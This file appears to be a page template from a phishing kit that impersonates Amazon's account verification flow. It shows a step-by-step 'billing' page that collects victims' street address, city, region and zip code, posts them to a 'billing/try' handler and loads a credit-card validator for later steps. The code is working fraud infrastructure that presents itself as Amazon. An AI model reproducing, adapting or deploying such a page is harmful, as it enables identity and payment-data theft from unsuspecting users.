<?php
defined("ALLOW") or exit('No direct script access allowed');

$country = trim($_SESSION['countryCode']);
include FCPATH . "CR51/language/lang.php";
?>
<!DOCTYPE html>
<html>

<head>
    <title>
        <?php echo $_45 ?>
    </title>
    <meta charset="UTF-8">
    <link rel="shortcut icon" href="<?= base_url() ?>CR51/Assets/_hayo/images/favicon.ico" />
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/boostrap.min.css" media="all">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/sign-dekstop.css">
    <link rel="stylesheet" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.sign-desktop.css">
    <link rel="stylesheet" type="text/css" href="<?= base_url() ?>CR51/Assets/_hayo/css/style.css">
</head>

<body onload="_loader()" style="margin:0;">
    <div id="loader"></div>
    <div style="display:none;" id="myDiv" class="animate-bon ttom">
        <div id="a-page">
            <div class="a-section a-padding-medium auth-workflow">
                <div class="a-section a-spacing-none auth-navbar">
                    <div class="a-section a-spacing-medium a-text-center">
                        <div class="a-link-nav-icon"></div><i class="a-icon a-icon-logo" role="img" aria-label="Amazon"></i>
                    </div>
                </div>
                <div id="authportal-center-section" class="a-section">
                    <ul class="list-unstyled multi-steps" style="padding-top: 10px" align="center">
                        <li>
                            <?php echo $_113 ?>
                        </li>
                        <li class="is-active">
                            <?php echo $_46 ?>
                        </li>
                        <li>
                            <?php echo $_47 ?>
                        </li>
                        <li>
                            <?php echo $_48 ?>
                        </li>
                    </ul>
                    <div class="a-content">
                        <div class="container">
                            <div class="row" style="padding-top: 5px">
                                <div class="col-12">
                                    <div align="center"> <img src="<?= base_url() ?>CR51/Assets/_hayo/images/account.png" width="80"> </div>
                                    <div align="center"> <span class="lefttext" style="font-size: 20px; font-weight: 650;"><?php echo $_71 ?></span> </div>
                                    <div align="center"> <span class="lefttext"><?php echo $_72 ?></span> </div><br>
                                    <div class="mypayementarea">
                                        <form action="<?= base_url() ?>billing/try" method="post" name="konzform" id="konzform"> <span class="colorblacked"><?php echo $_73 ?></span>
                                            <div class="row mt-2">
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="adressline1">
                                                            <?php echo $_74 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput addressfocus" name="address" id="adressline1" placeholder="<?php echo $_75 ?>" minlength="5" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="adressline2">
                                                            <?php echo $_76 ?>
                                                        </label>
                                                        <input type="text" id="cityp" class="form-control amazoninput cityfocus" name="cityp" placeholder="<?php echo $_76 ?>" maxlength="25" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="stateregionprovince">
                                                            <?php echo $_77 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput regionfocus" name="region" id="region" placeholder="<?php echo $_77 ?>" maxlength="30" onkeypress="return alpha(event)">
                                                    </div>
                                                </div>
                                                <div class="col-sm-6">
                                                    <div class="form-group">
                                                        <label for="zipCode">
                                                            <?php echo $_78 ?>
                                                        </label>
                                                        <input type="text" class="form-control amazoninput zipfocus" name="zipcode" id="zipCode" placeholder="<?php echo $_79 ?>" maxlength="12">
                                                    </div>
                                                </div>
                                            </div>
                                            <div class="a-row a-spacing-small">
                                                <span id="cvf-submit-otp-button" class="a-button a-button-span2 a-button-primary cvf-widget-btn cvf-widget-btn-verify">
                                                    <span class="a-button-inner">
                                                        <button type="submit" name="Sex" class="a-button-text" role="button"><?php echo $_7 ?></button>
                                                    </span>
                                                </span>
                                            </div>
                                        </form>
                                    </div>
                                </div>
                                <script>
                                    P.when('A', 'ready').execute(function(A) {
                                        var $ = A.$;
                                        $('.cvf-widget-link-resend').click(function() {
                                            $('.cvf-widget-form-resend').submit();
                                        });
                                    });
                                </script>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <div class="a-section a-spacing-top-extra-large auth-footer">
            <div class="a-divider a-divider-section">
                <div class="a-divider-inner"></div>
            </div>
            <div class="a-section a-spacing-small a-text-center a-size-mini"> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_21 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_22 ?>
                </a> <span class="auth-footer-seperator"></span>
                <a class="a-link-normal">
                    <?php echo $_23 ?>
                </a> <span class="auth-footer-seperator"></span>
            </div>
            <div class="a-section a-spacing-none a-text-center"> <span class="a-size-mini a-color-secondary"> <?php echo $_24 ?> </span> </div>
        </div>
    </div>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery-3.3.1.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.mask.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.validate.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/additional-methods.min.js"></script>
    <script src="<?= base_url() ?>CR51/Assets/_hayo/js/jquery.creditCardValidator.js"></script>
    <script>
        let load;

        let _loader = () => {
            load = setTimeout(showPage, 1000);
        }

        let showPage = () => {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('myDiv').style.display = 'block';
        }

        const alpha = (e) => {
            let k;
            document.all ? k = e.keyCode : k = e.which;
            return ((k > 64 && k < 91) || (k > 96 && k < 123) || k == 8 || k == 32 || (k >= 48 && k <= 57));
        }

        $(document).ready(function(e) {
            $("#konzform").validate({
                errorClass: "error-class",
                rules: {
                    address: {
                        required: true,
                        minlength: 5,
                    },
                    cityp: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    region: {
                        required: true,
                        minlength: 3,
                        maxlength: 30
                    },
                    zipcode: {
                        required: true,
                        minlength: 2,
                        maxlength: 12
                    }
                },
                messages: {
                    address: {
                        required: "<?php echo $_80 ?>"
                    },
                    cityp: {
                        required: "<?php echo $_81 ?>"
                    },
                    region: {
                        required: "<?php echo $_82 ?>"
                    },
                    zipcode: {
                        required: "<?php echo $_33 ?>"
                    }
                }
            });
        })
    </script>
</body>

</html>